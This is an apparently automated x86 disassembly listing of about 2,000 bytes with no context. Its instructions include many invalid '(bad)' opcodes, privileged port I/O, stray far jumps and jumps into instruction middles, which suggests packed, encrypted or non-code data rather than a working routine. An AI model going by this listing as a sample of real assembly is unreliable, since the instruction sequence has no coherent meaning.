  413c20:	mov    dl,0xad
  413c22:	hlt    
  413c23:	sub    esp,ebx
  413c25:	inc    ebx
  413c26:	sbb    BYTE PTR [edi-0x3a6909f1],dh
  413c2c:	imul   ebp,DWORD PTR [edi+ebp*1+0x2c],0xb3611036
  413c34:	jbe    0x413c74
  413c36:	into   
  413c37:	test   DWORD PTR [ebx+0x52],0xa24f507b
  413c3e:	mov    bh,0x65
  413c40:	mov    ds:0x324bdbc5,al
  413c45:	ret    0xbf9f
  413c48:	js     0x413c9d
  413c4a:	scas   eax,DWORD PTR es:[edi]
  413c4b:	adc    al,ah
  413c4d:	xchg   esi,eax
  413c4e:	leave  
  413c4f:	add    ecx,ecx
  413c51:	scas   eax,DWORD PTR es:[edi]
  413c52:	repz cmp ebp,eax
  413c55:	in     eax,0x30
  413c57:	out    0x21,al
  413c59:	fsubr  QWORD PTR [edx]
  413c5b:	jmp    0xb096:0xdf23f2df
  413c62:	cwde   
  413c63:	pushf  
  413c64:	dec    ebx
  413c65:	icebp  
  413c66:	leave  
  413c67:	mov    ds:0x58dcc21d,al
  413c6c:	xchg   edi,eax
  413c6d:	sahf   
  413c6e:	pop    ecx
  413c6f:	cli    
  413c70:	sbb    edi,esp
  413c72:	jmp    0x9015:0x271567d4
  413c79:	mov    fs,WORD PTR [ebp-0x1939a389]
  413c7f:	fild   DWORD PTR [eax-0x4f]
  413c82:	pop    ss
  413c83:	pop    eax
  413c84:	pusha  
  413c85:	stos   DWORD PTR es:[edi],eax
  413c86:	js     0x413ca9
  413c88:	repnz or edi,ecx
  413c8b:	add    eax,0x60c93f59
  413c90:	or     dh,bl
  413c92:	mov    ebx,0x77658456
  413c97:	xchg   edi,eax
  413c98:	jns    0x413c25
  413c9a:	inc    esi
  413c9b:	jge    0x413c8c
  413c9d:	dec    edi
  413c9e:	ss or  al,0xd1
  413ca1:	inc    esi
  413ca2:	scas   eax,DWORD PTR es:[edi]
  413ca3:	rcl    DWORD PTR [ebx],1
  413ca5:	div    BYTE PTR [ebx+eax*1+0x2c]
  413ca9:	xchg   edx,eax
  413caa:	push   esi
  413cab:	push   esp
  413cac:	xchg   esi,eax
  413cad:	sbb    esp,esi
  413caf:	jmp    0x413c91
  413cb1:	and    DWORD PTR [ecx+ebp*1],edx
  413cb4:	popa   
  413cb5:	add    dh,bl
  413cb7:	loope  0x413ca8
  413cb9:	adc    edx,esp
  413cbb:	(bad)  [ebx-0x4d]
  413cbe:	sbb    BYTE PTR [esi-0x309f4c21],0x3e
  413cc5:	lea    esp,[edx+0x2b]
  413cc8:	popa   
  413cc9:	jg     0x413d32
  413ccb:	xor    DWORD PTR [ecx],ecx
  413ccd:	sahf   
  413cce:	pop    eax
  413ccf:	outs   dx,BYTE PTR ds:[esi]
  413cd0:	add    al,0x3e
  413cd2:	jmp    0xe43057ea
  413cd7:	xlat   BYTE PTR ds:[ebx]
  413cd8:	les    eax,FWORD PTR [esi-0x437b1d27]
  413cde:	or     DWORD PTR [eax],ebp
  413ce0:	xor    al,0x8f
  413ce2:	into   
  413ce3:	add    DWORD PTR [ebp+0x6b],edi
  413ce6:	inc    edx
  413ce7:	clc    
  413ce8:	mov    ch,0x5f
  413cea:	pusha  
  413ceb:	loope  0x413d18
  413ced:	mov    ebp,0x19913c68
  413cf2:	push   cs
  413cf3:	mov    BYTE PTR ds:0x621996a4,bl
  413cf9:	mov    WORD PTR [ebx],ss
  413cfb:	mov    ss,WORD PTR [esi]
  413cfd:	add    eax,0x3e5c244e
  413d02:	(bad)  
  413d03:	xchg   cx,ax
  413d05:	mov    ah,0x91
  413d07:	fwait
  413d08:	sub    eax,0x6eb385f4
  413d0d:	in     al,dx
  413d0e:	mov    al,bl
  413d10:	sub    esp,ebp
  413d12:	stos   DWORD PTR es:[edi],eax
  413d13:	mov    eax,0x7afa852c
  413d18:	sub    eax,0x9524dafb
  413d1d:	push   edi
  413d1e:	dec    edx
  413d1f:	jbe    0x413d2e
  413d21:	adc    ah,BYTE PTR [ecx+0x34aa5272]
  413d27:	mov    edi,0x88928316
  413d2c:	bound  ebx,QWORD PTR [esi+0x42]
  413d2f:	adc    eax,0xe36b67ca
  413d34:	push   edi
  413d35:	mov    cl,0x64
  413d37:	mov    ecx,0xcfab2eb5
  413d3c:	dec    esp
  413d3d:	std    
  413d3e:	loopne 0x413d63
  413d40:	ja     0x413db3
  413d42:	and    BYTE PTR [edi-0x3efe8be5],cl
  413d48:	les    ebx,FWORD PTR [esi-0x2b104f59]
  413d4e:	xchg   edi,eax
  413d4f:	fld    TBYTE PTR [ebp-0x60c6c6d3]
  413d55:	imul   ebp,DWORD PTR [edi],0x6a4fac59
  413d5b:	(bad)  
  413d5c:	dec    ebp
  413d5d:	cmp    DWORD PTR [edi+0x4404bda3],edx
  413d63:	adc    eax,0xac484cf7
  413d68:	or     dh,BYTE PTR [ecx+ebp*2+0xb75e84c]
  413d6f:	adc    ecx,DWORD PTR [eax+0x59]
  413d72:	mov    bh,0xa5
  413d74:	std    
  413d75:	mov    esp,0x1eac422b
  413d7a:	or     edi,edi
  413d7c:	daa    
  413d7d:	push   0x5e
  413d7f:	out    0x63,al
  413d81:	je     0x413d21
  413d83:	push   ds
  413d84:	in     al,0x3
  413d86:	fidiv  WORD PTR [ebp+0x66]
  413d89:	ja     0x413dba
  413d8b:	push   cs
  413d8c:	ds (bad) 
  413d8e:	xchg   ebp,eax
  413d8f:	xor    DWORD PTR [edi+0x5ccc1560],edi
  413d95:	gs jae 0x413df7
  413d98:	or     DWORD PTR [esi+ebx*2],0x5511c54
  413d9f:	sub    eax,0x304d08c7
  413da4:	xchg   edi,eax
  413da5:	(bad)  
  413da6:	data16 scas al,BYTE PTR es:[edi]
  413da8:	pop    eax
  413da9:	cmp    edx,0xffffff88
  413dac:	mov    ch,0x6a
  413dae:	popa   
  413daf:	stos   BYTE PTR es:[edi],al
  413db0:	mov    cl,BYTE PTR [edx]
  413db2:	sub    bh,al
  413db4:	fisttp QWORD PTR ds:[esp+edx*1]
  413db8:	xchg   BYTE PTR [eax-0x5383cac8],al
  413dbe:	jno    0x413d43
  413dc0:	push   ebp
  413dc1:	jo     0x413ddf
  413dc3:	adc    eax,eax
  413dc5:	dec    eax
  413dc6:	sbb    ch,0x4c
  413dc9:	repz clc 
  413dcb:	jl     0x413d53
  413dcd:	push   ecx
  413dce:	loope  0x413dab
  413dd0:	add    esp,0xbc0bd379
  413dd6:	add    ch,BYTE PTR [ecx+0x33]
  413dd9:	push   edi
  413dda:	int    0x23
  413ddc:	call   DWORD PTR [edi]
  413dde:	mov    cl,0xfc
  413de0:	outs   dx,DWORD PTR ds:[esi]
  413de1:	jle    0x413e62
  413de3:	jecxz  0x413dde
  413de5:	xchg   edi,eax
  413de6:	add    al,BYTE PTR [esi+0x5a7f8402]
  413dec:	(bad)  
  413ded:	aad    0xa0
  413def:	cwde   
  413df0:	je     0x413e65
  413df2:	push   0x15f60a4f
  413df7:	xor    ch,bl
  413df9:	fild   WORD PTR [esi+0x45]
  413dfc:	das    
  413dfd:	aaa    
  413dfe:	xlat   BYTE PTR ds:[ebx]
  413dff:	xchg   ebp,edx
  413e01:	jbe    0x413e78
  413e03:	retf   
  413e04:	jae    0x413da2
  413e06:	adc    al,0x44
  413e08:	mov    DWORD PTR [eax],ebx
  413e0a:	push   eax
  413e0b:	es loop 0x413e0c
  413e0e:	push   0x8e63bede
  413e13:	inc    eax
  413e14:	std    
  413e15:	retf   
  413e16:	jne    0x413de3
  413e18:	cs jg  0x413e6b
  413e1b:	jmp    0xaac4:0xb5d0208d
  413e22:	push   ss
  413e23:	scas   al,BYTE PTR es:[edi]
  413e24:	fimul  DWORD PTR [ecx-0x775a000d]
  413e2a:	retf   0xf5b5
  413e2d:	xor    edi,DWORD PTR ds:0xc10e50bb
  413e33:	adc    ebx,edi
  413e35:	or     edx,DWORD PTR [ecx-0x30]
  413e38:	aam    0x11
  413e3a:	lahf   
  413e3b:	inc    edx
  413e3c:	fwait
  413e3d:	fs dec ebp
  413e3f:	mov    BYTE PTR [edi+0x72],bh
  413e42:	cwde   
  413e43:	test   al,0x7c
  413e45:	add    edx,ebx
  413e47:	fwait
  413e48:	jb     0x413de1
  413e4a:	or     ecx,DWORD PTR [esi-0x6]
  413e4d:	test   eax,0x9596369d
  413e52:	in     eax,0xce
  413e54:	mov    ch,0xd6
  413e56:	pop    esp
  413e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e58:	dec    edi
  413e59:	es push esp
  413e5b:	pop    ebp
  413e5c:	jl     0x413e80
  413e5e:	mov    ecx,0xad651593
  413e63:	or     al,0xaf
  413e65:	inc    edx
  413e66:	test   BYTE PTR [ebp-0x23],bh
  413e69:	push   edx
  413e6a:	dec    esi
  413e6b:	sub    esp,DWORD PTR ds:0x725e9c14
  413e71:	sar    BYTE PTR [eax],1
  413e73:	jnp    0x413eb0
  413e75:	fstp   DWORD PTR [ebx]
  413e77:	or     al,0x69
  413e79:	sbb    eax,0xd192d0d7
  413e7e:	xor    BYTE PTR [edi+ecx*2-0x76],dh
  413e82:	iret   
  413e83:	mov    dl,ch
  413e85:	add    DWORD PTR [edx],eax
  413e87:	ret    
  413e88:	(bad)  
  413e89:	ins    DWORD PTR es:[edi],dx
  413e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e8b:	xor    DWORD PTR [ebp-0x6],0x1f
  413e8f:	dec    eax
  413e90:	(bad)  
  413e91:	jmp    FWORD PTR [ecx+ebx*1+0x7b6cbf5b]
  413e98:	adc    DWORD PTR [ecx],0x4a
  413e9b:	push   ebp
  413e9c:	mov    eax,ds:0x50f442fa
  413ea1:	in     eax,dx
  413ea2:	mov    ch,al
  413ea4:	jg     0x413ee8
  413ea6:	enter  0x641e,0x84
  413eaa:	sub    DWORD PTR [edi-0x18],0x99e4789f
  413eb1:	shr    BYTE PTR [eax],cl
  413eb3:	dec    esp
  413eb4:	ret    
  413eb5:	nop
  413eb6:	cwde   
  413eb7:	ror    DWORD PTR [esi],cl
  413eb9:	icebp  
  413eba:	add    esi,DWORD PTR [ebx]
  413ebc:	scas   eax,DWORD PTR es:[edi]
  413ebd:	jno    0x413e84
  413ebf:	and    ch,ah
  413ec1:	stos   DWORD PTR es:[edi],eax
  413ec2:	push   esp
  413ec3:	xchg   edi,eax
  413ec4:	mov    eax,DWORD PTR [edi+0x5d]
  413ec7:	xchg   esi,eax
  413ec8:	xchg   DWORD PTR [ecx+0x68],ebx
  413ecb:	sbb    bh,BYTE PTR [ebp+0x2c]
  413ece:	xchg   BYTE PTR [ebp+0x32051187],dl
  413ed4:	sbb    BYTE PTR [ecx-0x4e],dl
  413ed7:	dec    ebp
  413ed8:	ins    DWORD PTR es:[edi],dx
  413ed9:	sbb    DWORD PTR [eax],ebp
  413edb:	push   edi
  413edc:	pop    es
  413edd:	add    esp,DWORD PTR [ecx+0x5b15b08e]
  413ee3:	icebp  
  413ee4:	lods   eax,DWORD PTR ds:[esi]
  413ee5:	out    0x38,eax
  413ee7:	fist   WORD PTR [ebx+0xc833355]
  413eed:	and    DWORD PTR [edx+0x20],ebx
  413ef0:	push   ebx
  413ef1:	push   ds
  413ef2:	stos   DWORD PTR es:[edi],eax
  413ef3:	dec    eax
  413ef4:	mov    edx,0x17c6cc0e
  413ef9:	aad    0xca
  413efb:	jmp    0x1885d60e
  413f00:	xor    BYTE PTR [edx],cl
  413f02:	(bad)  [ebx-0x558e91c0]
  413f08:	rol    ebp,1
  413f0a:	ficomp DWORD PTR [eax+edx*8]
  413f0d:	add    dh,BYTE PTR [edx-0x62]
  413f10:	stc    
  413f11:	stos   BYTE PTR es:[edi],al
  413f12:	retf   0x7c97
  413f15:	iret   
  413f16:	and    eax,DWORD PTR [ecx]
  413f18:	dec    ecx
  413f19:	ret    
  413f1a:	xchg   ebx,eax
  413f1b:	pushf  
  413f1c:	sbb    eax,edi
  413f1e:	dec    edi
  413f1f:	fnstsw WORD PTR [edi-0x77]
  413f22:	mov    ebp,0xc500a560
  413f27:	jo     0x413ed8
  413f29:	cmp    al,0xc1
  413f2c:	push   ebx
  413f2d:	jns    0x413f9e
  413f2f:	cmp    edx,DWORD PTR [ebp-0x4b80da13]
  413f35:	test   eax,0x6a3ddcf
  413f3a:	jno    0x413f2d
  413f3c:	cs jnp 0x413f96
  413f3f:	sbb    DWORD PTR [edx+eiz*8+0x2c],esi
  413f43:	xchg   ecx,eax
  413f44:	xchg   ebp,eax
  413f45:	mov    DWORD PTR [edi+0x53830e90],esp
  413f4b:	jmp    edx
  413f4d:	sbb    eax,0x2273c466
  413f52:	sbb    al,0xd4
  413f54:	pop    ecx
  413f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f56:	repz push esi
  413f58:	mov    esi,0x3e483862
  413f5d:	mov    esp,0xfc120873
  413f62:	push   cs
  413f63:	jge    0x413f91
  413f65:	std    
  413f66:	adc    esi,DWORD PTR [esp+edx*4+0x5f92e0b]
  413f6d:	pop    ss
  413f6e:	stc    
  413f6f:	jl     0x413efc
  413f71:	jo     0x413f9d
  413f73:	(bad)  [edx]
  413f75:	inc    edi
  413f76:	ffreep st(2)
  413f78:	lea    eax,[ecx]
  413f7a:	and    DWORD PTR cs:[edx+0x17],ecx
  413f7e:	xchg   ebx,eax
  413f7f:	xchg   ebx,eax
  413f80:	fdiv   QWORD PTR [ecx-0x55698e25]
  413f86:	xchg   DWORD PTR [ebx],ecx
  413f88:	pop    edx
  413f89:	xor    DWORD PTR [ebx],ebx
  413f8b:	jl     0x413f4b
  413f8d:	or     cl,BYTE PTR [edx-0x30]
  413f90:	push   edi
  413f91:	dec    ebx
  413f92:	test   eax,0xeb8a731d
  413f97:	mov    bh,0xd4
  413f99:	pop    edx
  413f9a:	pop    ss
  413f9b:	aaa    
  413f9c:	push   es
  413f9d:	sub    eax,0x164a9f02
  413fa2:	adc    BYTE PTR [edi-0x6844c76f],dl
  413fa8:	sub    esp,DWORD PTR [ebp+0x661db54]
  413fae:	fucom  st(4)
  413fb0:	xchg   edx,eax
  413fb1:	jno    0x413fbd
  413fb3:	mov    bh,0xb5
  413fb5:	mov    ds:0x2675b70b,eax
  413fba:	pop    ss
  413fbb:	out    0xb7,al
  413fbd:	mov    eax,0x6af97a86
  413fc2:	mov    al,0x3e
  413fc4:	pop    ecx
  413fc5:	push   ss
  413fc6:	aad    0x7b
  413fc8:	and    BYTE PTR [ebx+0x7f],al
  413fcb:	das    
  413fcc:	cmp    ah,cl
  413fce:	fwait
  413fcf:	and    DWORD PTR [ebp+0x239aeb6f],edi
  413fd5:	xor    bl,bl
  413fd7:	loope  0x413ff3
  413fd9:	bound  edi,QWORD PTR [edx+0x19]
  413fdc:	xor    al,0x9f
  413fde:	ds mov edi,0x632af663
  413fe4:	push   ecx
  413fe5:	xchg   ebp,eax
  413fe6:	push   esi
  413fe7:	sbb    esi,DWORD PTR cs:[edx+0x43]
  413feb:	retf   
  413fec:	jle    0x414024
  413fee:	jecxz  0x413fbc
  413ff0:	aas    
  413ff1:	adc    BYTE PTR [ecx-0x89b080a],cl
  413ff7:	js     0x41406d
  413ff9:	dec    ebp
  413ffa:	xor    DWORD PTR [esi+ebx*4],esi
  413ffd:	add    BYTE PTR [edx],al
  413fff:	pop    ebp
  414000:	and    eax,DWORD PTR [esi]
  414002:	repz aam 0xae
  414005:	mov    fs,WORD PTR [ecx+0x2e5d4a04]
  41400b:	aaa    
  41400c:	pop    ebx
  41400d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41400e:	cld    
  41400f:	in     al,0x38
  414011:	dec    esi
  414012:	bound  esp,QWORD PTR [ecx+0x1f]
  414015:	scas   al,BYTE PTR es:[edi]
  414016:	fcmovnu st,st(4)
  414018:	bound  ecx,QWORD PTR [ebp-0x2580f747]
  41401e:	test   eax,0x9dc24b49
  414023:	cdq    
  414024:	inc    edx
  414025:	loop   0x414044
  414027:	dec    ebx
  414028:	bnd jl 0x414064
  41402b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41402c:	daa    
  41402d:	ins    BYTE PTR es:[edi],dx
  41402e:	hlt    
  41402f:	jns    0x414023
  414031:	cmp    dl,dh
  414033:	mov    bl,BYTE PTR [ecx-0x38fce3d0]
  414039:	adc    DWORD PTR [edx+eax*8-0x20472835],esi
  414040:	outs   dx,DWORD PTR ds:[esi]
  414041:	pop    ds
  414042:	popa   
  414043:	push   es
  414044:	jbe    0x414092
  414046:	adc    eax,edi
  414048:	ficomp WORD PTR [ecx-0x4b]
  41404b:	ror    ch,0x2f
  41404e:	mov    bh,0xd0
  414050:	mov    ah,0x29
  414052:	out    0xf,eax
  414054:	std    
  414055:	cmp    al,0x90
  414057:	sub    eax,0xf013e019
  41405c:	mov    edx,0x11a3b6b
  414061:	cmp    dl,BYTE PTR [edx-0x14d93684]
  414067:	addr16 add al,0x4e
  41406a:	out    0x99,eax
  41406c:	or     ebx,esi
  41406e:	or     BYTE PTR [eax+edx*8-0x4323e6a1],dh
  414075:	add    BYTE PTR [ebx+0x798b5559],dl
  41407b:	nop
  41407c:	and    edx,DWORD PTR [ebx]
  41407e:	push   edx
  41407f:	repz in eax,0x3d
  414082:	cmp    BYTE PTR [ecx+0x1bd06da4],0x5b
  414089:	push   ebp
  41408a:	push   edi
  41408b:	scas   eax,DWORD PTR es:[edi]
  41408c:	call   0xc9be:0x4ea67578
  414093:	jmp    0x414061
  414095:	mov    dl,0x4a
  414097:	fidivr WORD PTR ss:[ecx+ecx*2-0x6651fa86]
  41409f:	test   DWORD PTR [edi+0x2a0b9ab8],esi
  4140a5:	loopne 0x41404c
  4140a7:	sub    edi,DWORD PTR [ebx-0x49]
  4140aa:	or     al,0x45
  4140ac:	dec    edx
  4140ad:	stos   BYTE PTR es:[edi],al
  4140ae:	sbb    DWORD PTR [eax+edx*2],0x15e7f127
  4140b5:	scas   al,BYTE PTR es:[edi]
  4140b6:	push   esi
  4140b7:	bound  ebx,QWORD PTR ds:0x5697d44c
  4140bd:	lds    edi,FWORD PTR [edi+0x704d5bfc]
  4140c3:	dec    ebx
  4140c4:	jl     0x414103
  4140c6:	popa   
  4140c7:	xor    ch,bh
  4140c9:	push   ds
  4140ca:	je     0x414084
  4140cc:	push   es
  4140cd:	or     al,0x1e
  4140cf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140d1:	stos   DWORD PTR es:[edi],eax
  4140d2:	enter  0x96ac,0x57
  4140d6:	out    dx,eax
  4140d7:	push   eax
  4140d8:	fcmovu st,st(4)
  4140da:	xor    al,0x8e
  4140dc:	and    ebx,DWORD PTR [esi]
  4140de:	ss std 
  4140e0:	into   
  4140e1:	jmp    0xa7f558f0
  4140e6:	adc    ch,dl
  4140e8:	xlat   BYTE PTR ds:[ebx]
  4140e9:	cs or  eax,0x31855ac0
  4140ef:	lds    edx,FWORD PTR [esi+0x75]
  4140f2:	mov    dh,cl
  4140f4:	mov    esi,ebx
  4140f6:	or     DWORD PTR [eax+esi*8],edi
  4140f9:	cmp    ebx,esp
  4140fb:	jg     0x414095
  4140fd:	or     ebp,DWORD PTR [ecx-0x1530841f]
  414103:	addr16 pusha 
  414105:	in     al,dx
  414106:	xchg   ebp,eax
  414107:	sbb    ebx,ebx
  414109:	int3   
  41410a:	xor    ch,BYTE PTR [edx+0x44]
  41410d:	push   eax
  41410e:	lods   al,BYTE PTR ds:[esi]
  41410f:	jl     0x4140a6
  414111:	nop
  414112:	or     al,0x3c
  414114:	loopne 0x414099
  414116:	mov    ecx,0x43dcea0b
  41411b:	daa    
  41411c:	push   ss
  41411d:	fisttp DWORD PTR [edi-0x166f942]
  414123:	leave  
  414124:	cmp    BYTE PTR [ebp+0x3d],ah
  414127:	jne    0x41418e
  414129:	dec    ebx
  41412a:	pop    ecx
  41412b:	pop    ebp
  41412c:	sub    BYTE PTR [ecx+eiz*8+0x54],0xe3
  414131:	mov    ch,0xbc
  414133:	std    
  414134:	repz test BYTE PTR [ecx],0x75
  414138:	stos   DWORD PTR es:[edi],eax
  414139:	add    BYTE PTR [eax],al
  41413b:	dec    eax
  41413c:	icebp  
  41413d:	ins    BYTE PTR es:[edi],dx
  41413e:	icebp  
  41413f:	and    dl,BYTE PTR [eax+ebp*8]
  414142:	sti    
  414143:	sbb    eax,0x2b3fe635
  414148:	xchg   esi,eax
  414149:	jb     0x414186
  41414b:	dec    ebp
  41414c:	ss dec eax
  41414e:	rcr    DWORD PTR [eax+0x14c09b06],cl
  414154:	adc    ah,BYTE PTR [ebx+0x392ef9f6]
  41415a:	lar    ebp,WORD PTR [ecx-0x237c6412]
  414161:	es pop ebx
  414163:	ret    
  414164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414165:	and    BYTE PTR [edi+edi*8],cl
  414168:	mov    dh,0x28
  41416a:	sub    esp,esi
  41416c:	out    0x9d,eax
  41416e:	or     DWORD PTR ds:0x7033dc32,eax
  414174:	pop    esi
  414175:	leave  
  414176:	out    dx,eax
  414177:	add    bl,al
  414179:	jle    0x414127
  41417b:	gs mov al,0xf9
  41417e:	out    0xc6,eax
  414180:	pop    esi
  414181:	mov    esi,0x2aaf07fe
  414186:	pop    ebx
  414187:	or     edi,DWORD PTR [eax+0x577519b2]
  41418d:	mov    edi,0x6fb3addf
  414192:	or     BYTE PTR [edx+eax*8],dh
  414195:	cmp    al,0xd6
  414197:	jns    0x4141e0
  414199:	cmp    ebp,DWORD PTR [edx+0x54aca28c]
  41419f:	inc    ebp
  4141a0:	fs mov edi,0xb40c4c2e
  4141a6:	jne    0x4141ac
  4141a8:	cli    
  4141a9:	sbb    eax,0xc25c1e2
  4141ae:	fcmovnu st,st(1)
  4141b0:	mov    dh,0xb8
  4141b2:	ds push ebp
  4141b4:	xchg   edi,eax
  4141b5:	mov    esp,0xdbb972d6
  4141ba:	xor    cl,BYTE PTR [ebx-0x29]
  4141bd:	retf   0xe7e6
  4141c0:	xor    DWORD PTR [esi+0x4c60e43c],edi
  4141c6:	adc    al,0xb1
  4141c8:	cmp    al,0x58
  4141ca:	lods   eax,DWORD PTR ds:[esi]
  4141cb:	in     eax,dx
  4141cc:	cmp    ah,BYTE PTR [edi+esi*4+0x4a9a9e17]
  4141d3:	and    ah,dl
  4141d5:	aas    
  4141d6:	push   esi
  4141d7:	fwait
  4141d8:	or     edi,esi
  4141da:	cwde   
  4141db:	arpl   ax,bx
  4141dd:	push   0xe929685e
  4141e2:	(bad)  
  4141e3:	(bad)  
  4141e4:	enter  0x6786,0x30
  4141e8:	jecxz  0x414250
  4141ea:	mov    ah,ah
  4141ec:	mov    eax,esp
  4141ee:	adc    eax,0x5130520e
  4141f3:	xchg   ebp,eax
  4141f4:	fstp   TBYTE PTR [edx+ecx*1]
  4141f7:	mov    ecx,0x104e5b78
  4141fc:	jmp    0x414254
  4141fe:	mov    ah,0x80
  414200:	xor    ah,BYTE PTR [esi-0x67]
  414203:	es or  eax,0xa33c1807
  414209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41420a:	push   ebp
  41420b:	fwait
  41420c:	imul   ebx,DWORD PTR [edx],0x3
  41420f:	fwait
  414210:	les    eax,FWORD PTR [edx-0x67]
  414213:	jnp    0x414204
  414215:	xor    DWORD PTR [edi],edi
  414217:	in     eax,dx
  414218:	test   BYTE PTR [ebp-0x1ced6c8],0xd6
  41421f:	mov    al,gs:0x5f008e66
  414225:	sbb    DWORD PTR [esi+0x54],esp
  414228:	repnz repz in al,0x52
  41422c:	cmp    edi,DWORD PTR [esi+0x68a69798]
  414232:	jecxz  0x4142a9
  414234:	out    dx,al
  414235:	aad    0x9
  414237:	push   edi
  414238:	cli    
  414239:	sbb    eax,0xc6bebab5
  41423e:	or     DWORD PTR [edx-0x7d223958],esi
  414244:	sub    esi,edx
  414246:	cmp    eax,0x586f8309
  41424b:	xchg   ebx,eax
  41424c:	xchg   ebx,eax
  41424d:	popf   
  41424e:	add    BYTE PTR [ecx-0x6],dl
  414251:	mov    DWORD PTR [edx+0x1e254f61],ebp
  414257:	jb     0x414239
  414259:	loopne 0x4142bc
  41425b:	pop    esi
  41425c:	nop
  41425d:	xchg   edx,eax
  41425e:	jl     0x414254
  414260:	stos   BYTE PTR es:[edi],al
  414261:	out    0x4e,al
  414263:	mov    esp,esp
  414265:	mov    al,0x29
  414267:	in     al,0x26
  414269:	pop    esp
  41426a:	sbb    ebx,edx
  41426c:	fst    QWORD PTR [edx-0x82f7240]
  414272:	mov    bl,0x3c
  414274:	jne    0x41423d
  414276:	iret   
  414277:	ins    BYTE PTR es:[edi],dx
  414278:	and    al,bl
  41427a:	pushf  
  41427b:	addr16 dec ebx
  41427d:	gs inc edx
  41427f:	or     DWORD PTR [edi+edi*4],edi
  414282:	xchg   BYTE PTR [ebx],ch
  414284:	loop   0x41422a
  414286:	inc    ecx
  414287:	dec    edi
  414288:	adc    BYTE PTR [edx+0x42],dh
  41428b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428c:	pop    edi
  41428d:	loopne 0x41422c
  41428f:	pop    es
  414290:	lahf   
  414291:	jecxz  0x414274
  414293:	aad    0x38
  414295:	adc    ah,dl
  414297:	pop    ebx
  414298:	mov    ah,0x90
  41429a:	and    DWORD PTR [edx],edi
  41429c:	and    edi,edx
  41429e:	push   0x646b4f99
  4142a3:	dec    edi
  4142a4:	xchg   esp,eax
  4142a5:	or     BYTE PTR [ebp+0x7a],dh
  4142a8:	fstp   QWORD PTR [ebp+edi*2-0x4cf19e01]
  4142af:	mov    ds:0xf49a8c91,eax
  4142b4:	and    dh,BYTE PTR [edi+0x73]
  4142b7:	jns    0x4142e0
  4142b9:	outs   dx,DWORD PTR ds:[esi]
  4142ba:	xor    eax,0xd7337771
  4142bf:	push   ebx
  4142c0:	sar    BYTE PTR [ebx+ebp*8-0x7d],cl
  4142c4:	push   ds
  4142c5:	and    ebx,0x4c
  4142c8:	sub    eax,0xeded1097
  4142cd:	mov    edx,0xc7397a02
  4142d2:	fcom   QWORD PTR [ecx+0x47c58f70]
  4142d8:	push   cs
  4142d9:	pop    ecx
  4142da:	call   0x89ec21d0
  4142df:	push   eax
  4142e0:	push   es
  4142e1:	mov    ebp,0xc0eda9ce
  4142e6:	adc    al,0xf2
  4142e8:	mov    al,0xbe
  4142ea:	dec    ebx
  4142eb:	mov    bl,0x36
  4142ed:	push   ebp
  4142ee:	jmp    0x23b24ee9
  4142f3:	jp     0x414280
  4142f5:	push   ds
  4142f6:	ret    
  4142f7:	add    bh,BYTE PTR ds:0x2b02fb6c
  4142fd:	push   es
  4142fe:	jecxz  0x414307
  414300:	adc    ah,dh
  414302:	sub    al,0xbe
  414304:	jg     0x4142b9
  414306:	jno    0x414305
  414308:	shl    BYTE PTR ds:0x1b7549c0,cl
  41430e:	fdiv   DWORD PTR [ecx-0x4f6abdf7]
  414314:	pop    ss
  414315:	or     cl,BYTE PTR [eax-0x4c]
  414318:	pop    ss
  414319:	or     DWORD PTR [ebx],esp
  41431b:	pushf  
  41431c:	retf   
  41431d:	pusha  
  41431e:	xchg   esp,eax
  41431f:	clc    
  414320:	iret   
  414321:	mov    eax,0x7bd5a9fb
  414326:	test   eax,0x4857554c
  41432b:	inc    edi
  41432c:	mov    ds:0x82e70d1d,eax
  414331:	loope  0x4142c3
  414333:	out    0x3d,al
  414335:	or     edx,eax
  414337:	xlat   BYTE PTR ds:[ebx]
  414338:	adc    eax,0xe1e06391
  41433d:	aam    0x1f
  41433f:	cmp    eax,0x50c3d1bb
  414344:	jp     0x4143bd
  414346:	push   cs
  414347:	sahf   
  414348:	pop    edi
  414349:	aaa    
  41434a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41434b:	add    al,dl
  41434d:	push   ebx
  41434e:	sub    eax,0x9a917508
  414353:	mov    WORD PTR [ebp+0x5c],es
  414356:	repz mov ds:0xbc3736ed,eax
  41435c:	pop    es
  41435d:	mov    ebx,db2
  414360:	adc    cl,BYTE PTR [ebx+0x1d82e3b1]
  414366:	dec    ebp
  414367:	pop    eax
  414368:	int    0xf8
  41436a:	mov    dl,0xfe
  41436c:	mov    esp,edi
  41436e:	ja     0x414314
  414370:	add    DWORD PTR [esi],esi
  414372:	shr    dh,0xcc
  414375:	out    dx,eax
  414376:	push   esp
  414377:	(bad)  [esi]
  414379:	adc    edi,ebp
  41437b:	push   edx
  41437c:	inc    eax
  41437d:	jo     0x414333
  41437f:	popf   
  414380:	out    dx,al
  414381:	adc    al,0x69
  414383:	stc    
  414384:	cmp    DWORD PTR [edi+eax*8-0x58],eax
  414388:	popa   
  414389:	mov    eax,0x906079b4
  41438e:	test   eax,0xac524edf
  414393:	push   es
  414394:	sub    eax,0x8516f013
  414399:	jno    0x414335
  41439b:	mov    bh,BYTE PTR [ebx-0x5b]
  41439e:	jae    0x4143b3
  4143a0:	mov    DWORD PTR [edi+0x7080c690],eax
  4143a6:	jo     0x414384
  4143a8:	fidiv  WORD PTR [edi+edi*8]
  4143ab:	jmp    0x618dbaee
  4143b0:	jno    0x41437b
  4143b2:	push   ebx
  4143b3:	ds push cs
  4143b5:	stc    
  4143b6:	les    ebx,FWORD PTR [ebx+0x7d]
  4143b9:	adc    eax,0x9d6bc1c3
  4143be:	ror    BYTE PTR [ecx],cl
  4143c0:	pushf  
  4143c1:	fdiv   DWORD PTR [ebx-0x5a5aba23]
  4143c7:	inc    esp
  4143c8:	(bad)  
  4143c9:	fadd   st(7),st
  4143cb:	repz xchg edx,eax
  4143cd:	push   edx
  4143ce:	adc    al,0x7c
  4143d0:	ds lahf 
  4143d2:	jp     0x4143b4
  4143d4:	out    dx,al
  4143d5:	adc    BYTE PTR [eax-0x6c],dh
